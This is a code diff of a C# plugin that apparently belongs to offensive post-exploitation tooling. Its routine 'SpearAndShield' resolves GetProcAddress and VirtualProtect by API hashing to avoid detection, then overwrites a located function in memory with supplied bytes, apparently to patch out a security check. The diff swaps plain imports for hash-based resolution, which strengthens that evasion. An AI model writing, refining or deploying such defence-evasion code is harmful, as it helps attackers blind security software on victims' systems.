@@ -24,10 +24,7 @@ namespace Plugin
 
         [DllImport("kernel32")]
         public static extern IntPtr LoadLibrary(string name);
-        //[DllImport("kernel32")]
-        //public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-        //[DllImport("kernel32")]
-        //public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+        
         public static ResponseResult Execute(Dictionary<string, object> args)
         {
             try
@@ -76,7 +73,7 @@ namespace Plugin
                 };
             }
         }
-        
+
         private static bool SpearAndShield(byte[] shield)
         {
             try
@@ -95,9 +92,8 @@ namespace Plugin
 
                 IntPtr ptrGPA = HInvoke.GetfuncaddressbyHash("kernel32.dll", GetProcAddrHash);
                 IntPtr ptrVP = HInvoke.GetfuncaddressbyHash("kernel32.dll", VirtPro);
-                //IntPtr pShield = GetProcAddress(pSword, Encoding.ASCII.GetString(bufSword));
-                GPADelegate gpa = (GPADelegate)Marshal.GetDelegateForFunctionPointer(ptrGPA, typeof(GPADelegate));
 
+                GPADelegate gpa = (GPADelegate)Marshal.GetDelegateForFunctionPointer(ptrGPA, typeof(GPADelegate));
                 IntPtr pShield = gpa(pSword, Encoding.ASCII.GetString(bufSword));
 
                 if (pShield == IntPtr.Zero)
@@ -115,7 +111,7 @@ namespace Plugin
                 Marshal.Copy(shield, 0, pShield, shield.Length);
                 return true;
             }
-            catch (Exception e)
+            catch
             {
                 return false;
             }
